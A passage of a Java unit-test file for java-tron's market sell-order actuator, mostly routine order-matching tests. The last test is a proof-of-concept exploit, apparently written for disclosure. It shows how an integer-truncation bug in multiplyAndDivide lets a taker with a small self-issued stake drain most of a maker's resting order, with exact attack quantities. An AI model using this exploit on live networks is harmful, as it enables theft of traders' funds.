    // ByteString makerOrderId2 = makerAccountOrderCapsule.getOrdersList().get(1);

    //check order
    MarketOrderCapsule orderCapsule = orderStore.get(orderId.toByteArray());
    Assert.assertEquals(300L, orderCapsule.getSellTokenQuantityRemain());
    Assert.assertEquals(State.ACTIVE, orderCapsule.getSt());

    // MarketOrderCapsule makerOrderCapsule1 = orderStore.get(makerOrderId1.toByteArray());
    // Assert.assertEquals(0L, makerOrderCapsule1.getSellTokenQuantityRemain());
    // Assert.assertEquals(State.INACTIVE, makerOrderCapsule1.getSt());

    // MarketOrderCapsule makerOrderCapsule2 = orderStore.get(makerOrderId2.toByteArray());
    // Assert.assertEquals(0L, makerOrderCapsule2.getSellTokenQuantityRemain());
    // Assert.assertEquals(State.INACTIVE, makerOrderCapsule2.getSt());

    //check pairToPrice
    Assert.assertEquals(1,
        pairToPriceStore.getPriceNum(sellTokenId.getBytes(), buyTokenId.getBytes()));

    List<byte[]> takerPriceKeysList = pairPriceToOrderStore
        .getPriceKeysList(sellTokenId.getBytes(), buyTokenId.getBytes(), 1);
    MarketPrice takerPrice = MarketUtils.decodeKeyToMarketPrice(takerPriceKeysList.get(0));
    // 800:200 => 4:1
    Assert.assertEquals(4L, takerPrice.getSellTokenQuantity());
    Assert.assertEquals(1L, takerPrice.getBuyTokenQuantity());

    Assert.assertEquals(1,
        pairToPriceStore.getPriceNum(TOKEN_ID_TWO.getBytes(), TOKEN_ID_ONE.getBytes()));

    List<byte[]> makerPriceKeysList = pairPriceToOrderStore
        .getPriceKeysList(TOKEN_ID_TWO.getBytes(), TOKEN_ID_ONE.getBytes(), 1);
    MarketPrice marketPrice = MarketUtils.decodeKeyToMarketPrice(makerPriceKeysList.get(0));
    // 100:500 => 1:5
    Assert.assertEquals(1L, marketPrice.getSellTokenQuantity());
    Assert.assertEquals(5L, marketPrice.getBuyTokenQuantity());

    //check pairPriceToOrder
    byte[] pairPriceKey = MarketUtils.createPairPriceKey(
        TOKEN_ID_TWO.getBytes(), TOKEN_ID_ONE.getBytes(),
        100L, 200L);
    MarketOrderIdListCapsule orderIdListCapsule = pairPriceToOrderStore
        .getUnchecked(pairPriceKey);
    Assert.assertNull(orderIdListCapsule);

    pairPriceKey = MarketUtils.createPairPriceKey(
        TOKEN_ID_TWO.getBytes(), TOKEN_ID_ONE.getBytes(),
        100L, 300L);
    orderIdListCapsule = pairPriceToOrderStore
        .getUnchecked(pairPriceKey);
    Assert.assertNull(orderIdListCapsule);

    Assert.assertEquals(2, ret.getOrderDetailsList().size());

    MarketOrderDetail orderDetail = ret.getOrderDetailsList().get(0);
    // Assert.assertEquals(makerOrderCapsule1.getID(), orderDetail.getMakerOrderId());
    Assert.assertEquals(orderCapsule.getID(), orderDetail.getTakerOrderId());
    Assert.assertEquals(200L, orderDetail.getFillSellQuantity());
    Assert.assertEquals(100L, orderDetail.getFillBuyQuantity());
    MarketOrderCapsule makerOrderCapsule1 = orderStore
        .get(orderDetail.getMakerOrderId().toByteArray());
    Assert.assertEquals(0L, makerOrderCapsule1.getSellTokenQuantityRemain());
    Assert.assertEquals(State.INACTIVE, makerOrderCapsule1.getSt());

    orderDetail = ret.getOrderDetailsList().get(1);
    // Assert.assertEquals(makerOrderCapsule2.getID(), orderDetail.getMakerOrderId());
    Assert.assertEquals(orderCapsule.getID(), orderDetail.getTakerOrderId());
    Assert.assertEquals(300L, orderDetail.getFillSellQuantity());
    Assert.assertEquals(100L, orderDetail.getFillBuyQuantity());
    MarketOrderCapsule makerOrderCapsule2 = orderStore
        .get(orderDetail.getMakerOrderId().toByteArray());
    Assert.assertEquals(0L, makerOrderCapsule2.getSellTokenQuantityRemain());
    Assert.assertEquals(State.INACTIVE, makerOrderCapsule2.getSt());

  }

  /**
   * match with 2 existing buy orders and complete the taker
   */
  @Test
  public void partMatchTakerBuyOrders1() throws Exception {

    InitAsset();

    //(sell id_1  and buy id_2)
    String sellTokenId = TOKEN_ID_ONE;
    long sellTokenQuant = 800L;
    String buyTokenId = TOKEN_ID_TWO;
    long buyTokenQuant = 200L;

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);
    Assert.assertEquals(sellTokenQuant,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));

    // Initialize the order book

    //add three order(sell id_2 and buy id_1) with different price by the same account
    //TOKEN_ID_TWO is twice as expensive as TOKEN_ID_ONE
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        200L, OWNER_ADDRESS_SECOND);
    addOrder(TOKEN_ID_TWO, 200L, TOKEN_ID_ONE,
        800L, OWNER_ADDRESS_SECOND);
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        500L, OWNER_ADDRESS_SECOND);

    //get storeDB instance
    ChainBaseManager chainBaseManager = dbManager.getChainBaseManager();
    MarketAccountStore marketAccountStore = chainBaseManager.getMarketAccountStore();
    MarketOrderStore orderStore = chainBaseManager.getMarketOrderStore();
    MarketPairToPriceStore pairToPriceStore = chainBaseManager.getMarketPairToPriceStore();
    MarketPairPriceToOrderStore pairPriceToOrderStore = chainBaseManager
        .getMarketPairPriceToOrderStore();

    Assert.assertEquals(3,
        pairToPriceStore.getPriceNum(TOKEN_ID_TWO.getBytes(), TOKEN_ID_ONE.getBytes()));

    // do process
    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    TransactionResultCapsule ret = new TransactionResultCapsule();
    actuator.validate();
    actuator.execute(ret);

    //check balance and token
    accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    Assert.assertEquals(0L,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));
    Assert.assertEquals(250L,
            (long) accountCapsule.getAssetV2MapForTest().get(buyTokenId));

    byte[] makerAddress = ByteArray.fromHexString(OWNER_ADDRESS_SECOND);
    AccountCapsule makerAccountCapsule = dbManager.getAccountStore().get(makerAddress);
    Assert.assertEquals(800L,
            (long) makerAccountCapsule.getAssetV2MapForTest().get(sellTokenId));

    //check accountOrder
    MarketAccountOrderCapsule accountOrderCapsule = marketAccountStore.get(ownerAddress);
    Assert.assertEquals(0, accountOrderCapsule.getCount());
    // ByteString orderId = accountOrderCapsule.getOrdersList().get(0);

    MarketAccountOrderCapsule makerAccountOrderCapsule = marketAccountStore.get(makerAddress);
    Assert.assertEquals(2, makerAccountOrderCapsule.getCount());
    // ByteString makerOrderId1 = makerAccountOrderCapsule.getOrdersList().get(0);
    ByteString makerOrderId2 = makerAccountOrderCapsule.getOrdersList().get(0);

    //check order
    // MarketOrderCapsule orderCapsule = orderStore.get(orderId.toByteArray());
    // Assert.assertEquals(0L, orderCapsule.getSellTokenQuantityRemain());
    // Assert.assertEquals(State.INACTIVE, orderCapsule.getSt());

    // MarketOrderCapsule makerOrderCapsule1 = orderStore.get(makerOrderId1.toByteArray());
    // Assert.assertEquals(0L, makerOrderCapsule1.getSellTokenQuantityRemain());
    // Assert.assertEquals(State.INACTIVE, makerOrderCapsule1.getSt());

    MarketOrderCapsule makerOrderCapsule2 = orderStore.get(makerOrderId2.toByteArray());
    Assert.assertEquals(50L, makerOrderCapsule2.getSellTokenQuantityRemain());
    Assert.assertEquals(State.ACTIVE, makerOrderCapsule2.getSt());

    //check pairToPrice
    byte[] takerPair = MarketUtils.createPairKey(sellTokenId.getBytes(), buyTokenId.getBytes());
    Assert.assertEquals(0,
        pairToPriceStore.getPriceNum(sellTokenId.getBytes(), buyTokenId.getBytes()));

    byte[] makerPair = MarketUtils.createPairKey(TOKEN_ID_TWO.getBytes(), TOKEN_ID_ONE.getBytes());
    Assert.assertEquals(2,
        pairToPriceStore.getPriceNum(TOKEN_ID_TWO.getBytes(), TOKEN_ID_ONE.getBytes()));

    List<byte[]> makerPriceKeysList = pairPriceToOrderStore
        .getPriceKeysList(TOKEN_ID_TWO.getBytes(), TOKEN_ID_ONE.getBytes(), 2);
    MarketPrice makerPrice = MarketUtils.decodeKeyToMarketPrice(makerPriceKeysList.get(0));
    // 200:800 => 1:4
    Assert.assertEquals(1L, makerPrice.getSellTokenQuantity());
    Assert.assertEquals(4L, makerPrice.getBuyTokenQuantity());

    //check pairPriceToOrder
    byte[] pairPriceKey = MarketUtils.createPairPriceKey(
        TOKEN_ID_TWO.getBytes(), TOKEN_ID_ONE.getBytes(),
        100L, 200L);
    MarketOrderIdListCapsule orderIdListCapsule = pairPriceToOrderStore
        .getUnchecked(pairPriceKey);
    Assert.assertNull(orderIdListCapsule);

    pairPriceKey = MarketUtils.createPairPriceKey(
        TOKEN_ID_ONE.getBytes(), TOKEN_ID_TWO.getBytes(),
        800L, 200L);
    orderIdListCapsule = pairPriceToOrderStore
        .getUnchecked(pairPriceKey);
    Assert.assertNull(orderIdListCapsule);
  }


  /**
   * match with 2 existing buy orders and complete the maker, taker left not enough and return
   * left（Accuracy problem）
   */
  @Test
  public void partMatchMakerLeftNotEnoughBuyOrders1() throws Exception {

    InitAsset();

    //(sell id_1  and buy id_2)
    String sellTokenId = TOKEN_ID_ONE;
    long sellTokenQuant = 201L;
    String buyTokenId = TOKEN_ID_TWO;
    long buyTokenQuant = 100L;

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);
    Assert.assertEquals(sellTokenQuant,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));

    // Initialize the order book

    //add three order(sell id_2 and buy id_1) with different price by the same account
    //TOKEN_ID_TWO is twice as expensive as TOKEN_ID_ONE
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        200L, OWNER_ADDRESS_SECOND);
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        200L, OWNER_ADDRESS_SECOND);
    addOrder(TOKEN_ID_TWO, 100L, TOKEN_ID_ONE,
        500L, OWNER_ADDRESS_SECOND);

    // do process
    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    TransactionResultCapsule ret = new TransactionResultCapsule();
    actuator.validate();
    actuator.execute(ret);

    //get storeDB instance
    ChainBaseManager chainBaseManager = dbManager.getChainBaseManager();
    MarketAccountStore marketAccountStore = chainBaseManager.getMarketAccountStore();
    MarketOrderStore orderStore = chainBaseManager.getMarketOrderStore();
    MarketPairToPriceStore pairToPriceStore = chainBaseManager.getMarketPairToPriceStore();
    MarketPairPriceToOrderStore pairPriceToOrderStore = chainBaseManager
        .getMarketPairPriceToOrderStore();

    //check balance and token
    accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    Assert.assertEquals(1L,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));
    Assert.assertEquals(100L,
            (long) accountCapsule.getAssetV2MapForTest().get(buyTokenId));

    byte[] makerAddress = ByteArray.fromHexString(OWNER_ADDRESS_SECOND);
    AccountCapsule makerAccountCapsule = dbManager.getAccountStore().get(makerAddress);
    Assert.assertEquals(200L,
            (long) makerAccountCapsule.getAssetV2MapForTest().get(sellTokenId));

    //check accountOrder
    MarketAccountOrderCapsule accountOrderCapsule = marketAccountStore.get(ownerAddress);
    Assert.assertEquals(0, accountOrderCapsule.getCount());
    // ByteString orderId = accountOrderCapsule.getOrdersList().get(0);

    MarketAccountOrderCapsule makerAccountOrderCapsule = marketAccountStore.get(makerAddress);
    Assert.assertEquals(2, makerAccountOrderCapsule.getCount());
    // ByteString makerOrderId1 = makerAccountOrderCapsule.getOrdersList().get(0);
    ByteString makerOrderId2 = makerAccountOrderCapsule.getOrdersList().get(0);

    //check order
    // MarketOrderCapsule orderCapsule = orderStore.get(orderId.toByteArray());
    // Assert.assertEquals(0L, orderCapsule.getSellTokenQuantityRemain());
    // Assert.assertEquals(State.INACTIVE, orderCapsule.getSt());

    // MarketOrderCapsule makerOrderCapsule1 = orderStore.get(makerOrderId1.toByteArray());
    // Assert.assertEquals(0L, makerOrderCapsule1.getSellTokenQuantityRemain());
    // Assert.assertEquals(State.INACTIVE, makerOrderCapsule1.getSt());

    MarketOrderCapsule makerOrderCapsule2 = orderStore.get(makerOrderId2.toByteArray());
    Assert.assertEquals(100L, makerOrderCapsule2.getSellTokenQuantityRemain());
    Assert.assertEquals(State.ACTIVE, makerOrderCapsule2.getSt());

    //check pairToPrice
    byte[] takerPair = MarketUtils.createPairKey(sellTokenId.getBytes(), buyTokenId.getBytes());
    Assert.assertEquals(0,
        pairToPriceStore.getPriceNum(sellTokenId.getBytes(), buyTokenId.getBytes()));

    byte[] makerPair = MarketUtils.createPairKey(TOKEN_ID_TWO.getBytes(), TOKEN_ID_ONE.getBytes());
    Assert.assertEquals(2,
        pairToPriceStore.getPriceNum(TOKEN_ID_TWO.getBytes(), TOKEN_ID_ONE.getBytes()));

    List<byte[]> makerPriceKeysList = pairPriceToOrderStore
        .getPriceKeysList(TOKEN_ID_TWO.getBytes(), TOKEN_ID_ONE.getBytes(), 2);
    MarketPrice marketPrice = MarketUtils.decodeKeyToMarketPrice(makerPriceKeysList.get(0));
    // 100:200 => 1:2
    Assert.assertEquals(1L, marketPrice.getSellTokenQuantity());
    Assert.assertEquals(2L, marketPrice.getBuyTokenQuantity());

    //check pairPriceToOrder
    byte[] pairPriceKey = MarketUtils.createPairPriceKey(
        TOKEN_ID_ONE.getBytes(), TOKEN_ID_TWO.getBytes(),
        201L, 100L);
    MarketOrderIdListCapsule orderIdListCapsule = pairPriceToOrderStore
        .getUnchecked(pairPriceKey);
    Assert.assertNull(orderIdListCapsule);
  }

  @Test
  public void exceedMaxMatchNumLimit() throws Exception {

    InitAsset();

    int start = 10;
    int limit = MarketSellAssetActuator.getMAX_MATCH_NUM();
    int step = 1;
    int end = start + step * limit;

    //(sell id_1  and buy id_2)
    String sellTokenId = TOKEN_ID_ONE;
    String buyTokenId = TOKEN_ID_TWO;
    long buyTokenQuant = 400L;
    long sellTokenQuant = buyTokenQuant * (end / start + 1);

    byte[] ownerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule accountCapsule = dbManager.getAccountStore().get(ownerAddress);
    accountCapsule.addAssetAmountV2(sellTokenId.getBytes(), sellTokenQuant,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(ownerAddress, accountCapsule);
    Assert.assertEquals(sellTokenQuant,
            (long) accountCapsule.getAssetV2MapForTest().get(sellTokenId));

    // Initialize the order book

    // at least limit+1 times
    for (int i = start; i <= end; i += step) {
      addOrder(buyTokenId, (long) start, sellTokenId, i, OWNER_ADDRESS_SECOND);
    }

    // this order(taker) need to match 21 times
    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, sellTokenId, sellTokenQuant, buyTokenId, buyTokenQuant));

    String errorMessage =
        "Too many matches. MAX_MATCH_NUM = " + MarketSellAssetActuator.getMAX_MATCH_NUM();
    try {
      TransactionResultCapsule ret = new TransactionResultCapsule();
      actuator.validate();
      actuator.execute(ret);
      fail(errorMessage);
    } catch (ContractExeException e) {
      Assert.assertEquals(errorMessage, e.getMessage());
    } catch (Exception e) {
      Assert.assertTrue(false);
    }
  }

  @Test
  public void testGetOwnerAddress() throws InvalidProtocolBufferException {
    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager())
        .setAny(getContract(OWNER_ADDRESS_FIRST, "sellToken", 100L, "buyToken", 200L));

    Assert.assertEquals(OWNER_ADDRESS_FIRST,
        ByteArray.toHexString(actuator.getOwnerAddress().toByteArray()));
  }







  /**
   * PoC for: MarketUtils.multiplyAndDivide() silently truncates BigInteger results via
   * .longValue() when the exact quotient a*b/c exceeds Long.MAX_VALUE. In the
   * "taker < maker" branch of MarketSellAssetActuator.matchSingleOrder(), that raw
   * (possibly wrapped) quotient is credited DIRECTLY to the taker's balance via
   * addTrxOrToken(), while the taker is simultaneously charged their FULL stated
   * sellTokenQuantity.
   *
   * Economic framing: the attacker's "sell" leg (TOKEN_ID_ONE here) can be a worthless,
   * freely self-issued TRC10 token. The "buy" leg (TOKEN_ID_TWO here) stands in for any
   * real, valuable token that an honest market-maker has posted a large resting order in.
   * This test shows the attacker paying a modest, self-issued stake and draining ~96%
   * of the maker's real order in return.
   *
   * Numbers (verified independently in Python before writing this test):
   *   maker order:  sell 1_000_000_000_000_000 (the MARKET_QUANTITY_LIMIT default cap)
   *                 of TOKEN_ID_TWO, wanting just 1 of TOKEN_ID_ONE
   *   taker order:  sell 9_223_373 of TOKEN_ID_ONE, wanting 1 of TOKEN_ID_TWO
   *                 (trivial price floor -> guaranteed to match)
   *
   *   true exact quotient  a*b/c = 9223373 * 1e15 / 1 = 9223373000000000000000
   *   BigInteger.longValue() truncation -> 963145224192000   (< b, so the vulnerable
   *                                                            branch is selected)
   *
   *   => taker pays all 9,223,373 of TOKEN_ONE, is credited 963,145,224,192,000 of
   *      TOKEN_TWO. Leverage ~104,424,403x. Maker's resting order is left with only
   *      36,854,775,808,000 of its original 1e15 remaining (drained by ~96.3%).
   *
   * Execution status:
   * Successfully compiled and executed against the Java-Tron test harness.
   * The regression test passed, confirming the demonstrated settlement result.
   */
  @Test
  public void longValueTruncationDrainsRestingMakerOrder() throws Exception {

    InitAsset();

    // ---- Step 1: honest maker posts a large, plainly-priced resting order --------------
    // Sells 1e15 of TOKEN_TWO (stand-in for a real, valuable asset) for just 1 of TOKEN_ONE.
    // This is an extreme/generous maker price on purpose, to make the PoC's branch
    // selection unambiguous; the underlying bug does not require the maker's price to be
    // this extreme -- it only requires the maker's resting sellTokenQuantity to be large
    // enough (close to the quantity cap) for leverage > 1x. See write-up for the general
    // profitability condition (leverage ~ b^2 / 9.22e18).
    long makerSellQuant = 1_000_000_000_000_000L; // = MARKET_QUANTITY_LIMIT default
    long makerBuyQuant = 1L;
    addOrder(TOKEN_ID_TWO, makerSellQuant, TOKEN_ID_ONE, makerBuyQuant, OWNER_ADDRESS_SECOND);

    // ---- Step 2: attacker funds a taker order with a SMALL, self-issued-style stake ----
    long attackerStake = 9_223_373L; // "a" -- tiny relative to the maker's 1e15 order
    long attackerPriceFloor = 1L;    // trivial price requirement, guarantees a match

    byte[] takerAddress = ByteArray.fromHexString(OWNER_ADDRESS_FIRST);
    AccountCapsule takerAccount = dbManager.getAccountStore().get(takerAddress);
    takerAccount.addAssetAmountV2(TOKEN_ID_ONE.getBytes(), attackerStake,
        dbManager.getDynamicPropertiesStore(), dbManager.getAssetIssueStore());
    dbManager.getAccountStore().put(takerAddress, takerAccount);

    // ---- Step 3: fire the taker order that triggers the truncation ---------------------
    MarketSellAssetActuator actuator = new MarketSellAssetActuator();
    actuator.setChainBaseManager(dbManager.getChainBaseManager()).setAny(getContract(
        OWNER_ADDRESS_FIRST, TOKEN_ID_ONE, attackerStake, TOKEN_ID_TWO, attackerPriceFloor));

    TransactionResultCapsule ret = new TransactionResultCapsule();
    actuator.validate();
    actuator.execute(ret);

    // ---- Step 4: assert the drain --------------------------------------------------------
    takerAccount = dbManager.getAccountStore().get(takerAddress);

    // Attacker's self-issued-style stake is fully consumed...
    Assert.assertEquals(
    "taker's TOKEN_ONE balance should be fully spent",
    Long.valueOf(0L),
    takerAccount.getAssetV2MapForTest().get(TOKEN_ID_ONE)
);

    // ...but they are credited a wildly disproportionate amount of the maker's real token,
    // via the raw truncated multiplyAndDivide() result, not an honest price calculation.
    long expectedWrappedCredit = 963_145_224_192_000L;
    Assert.assertEquals(
        "taker should have been credited the truncated multiplyAndDivide() result directly",
        expectedWrappedCredit,
        (long) takerAccount.getAssetV2MapForTest().get(TOKEN_ID_TWO));

    // Leverage check: attacker paid attackerStake (~9.2M) of a token they can self-issue for
    // free, and received a token amount ~104 million times larger in a token that (in a real
    // deployment) the attacker does not control the supply of.
    double leverage = (double) expectedWrappedCredit / attackerStake;
    Assert.assertTrue("leverage should be on the order of 1e8x, got " + leverage,
        leverage > 1_000_000.0);

    // Maker's resting order is left corrupted: only reduced by the WRAPPED value, not a
    // value consistent with either the maker's stated price or an honest proportional fill.
    MarketAccountOrderCapsule makerAccountOrderCapsule =
        dbManager.getChainBaseManager().getMarketAccountStore()
            .get(ByteArray.fromHexString(OWNER_ADDRESS_SECOND));
    ByteString makerOrderId = makerAccountOrderCapsule.getOrdersList().get(0);
    MarketOrderCapsule makerOrderCapsule =
        dbManager.getChainBaseManager().getMarketOrderStore().get(makerOrderId.toByteArray());

    long expectedMakerRemaining = makerSellQuant - expectedWrappedCredit; // 36,854,775,808,000
    Assert.assertEquals(expectedMakerRemaining, makerOrderCapsule.getSellTokenQuantityRemain());
  }

}
